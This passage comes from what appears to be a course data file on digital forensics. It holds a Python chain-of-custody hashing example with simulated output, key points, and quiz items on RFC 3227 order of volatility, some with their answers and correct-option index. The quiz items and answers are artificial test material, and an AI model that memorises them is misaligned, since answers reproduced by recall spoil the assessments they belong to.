        "Target Item": evidence_name,
        "Investigator": investigator,
        "Timestamp": time.strftime("%Y-%m-%d %H:%M:%S UTC", time.gmtime()),
        "Byte Size": len(raw_bytes),
        "SHA-256 Digest": evidence_hash,
        "Integrity Status": "VERIFIED_INTACT"
    }
    return record

# Simulated seized volatile RAM artifact
simulated_ram_artifact = b"DUMP_PROCESS_TREE_PID_4412_CMD_powershell_downloadstring_MALWARE_HASH"
audit_trail = generate_evidence_record("Physical_RAM_Dump.raw", simulated_ram_artifact, "Officer_CampusLoop")

print("=== Chain of Custody Evidence Intake Log ===")
for key, val in audit_trail.items():
    print(f"{key:18}: {val}")`,
              output: `=== Chain of Custody Evidence Intake Log ===
Evidence ID       : EV-1793235600
Target Item       : Physical_RAM_Dump.raw
Investigator      : Officer_CampusLoop
Timestamp         : 2026-10-29 03:25:00 UTC
Byte Size         : 69
SHA-256 Digest    : afc358e0a81180cf2a4e286e7ec57173e6b567b4588998495a122e2cfbc39e14
Integrity Status  : VERIFIED_INTACT`
            }
          ],
          keyPoints: [
            "Order of Volatility mandates acquiring ephemeral RAM before non-volatile hard disk media.",
            "Write blockers prevent investigators from inadvertently modifying digital evidence during cloning.",
            "Cryptographic hashing (SHA-256) verifies evidence integrity throughout the Chain of Custody.",
            "NIST SP 800-61 defines the 6-stage Incident Response lifecycle from Preparation to Lessons Learned.",
            "Penetration testing follows Reconnaissance, Scanning, Exploitation, and Privilege Escalation."
          ],
          theoryQuestions: [
            {
              question: "Outline the RFC 3227 Order of Volatility for digital forensic investigations. Why is pulling the power plug of a running machine considered a destructive investigation failure?",
              marks: "7 Marks",
              answer: "The RFC 3227 Order of Volatility is: 1. CPU registers and cache. 2. Physical RAM, routing tables, ARP cache, running processes. 3. Temporary files and swap space. 4. Persistent disk storage. 5. Network topology and remote logs. 6. Archival backups. Pulling the power cord immediately cuts power to volatile RAM, instantly destroying all executing malware processes, in-memory decryption keys (BitLocker, TLS session keys), active network socket connections, and injected memory-only DLLs that never touched the physical hard drive. Best practice mandates capturing a live physical RAM dump prior to any machine shutdown."
            }
          ],
          mcqs: [
            {
              question: "Under RFC 3227 Order of Volatility, which category of digital evidence should be captured FIRST during incident response?",
              options: [
                "CPU Registers and Physical RAM",
                "Backup Storage Tapes",
                "Solid State Drive (SSD) Filesystems",
                "Web Server Access Log Files on Disk"
              ],
              correctIndex: 0,
              explanation: "CPU registers, cache, and physical RAM are volatile and lost immediately upon reboot or power cutoff, making them highest priority under RFC 3227."
            }
          ]
        }
      ]
    }
  ]
};
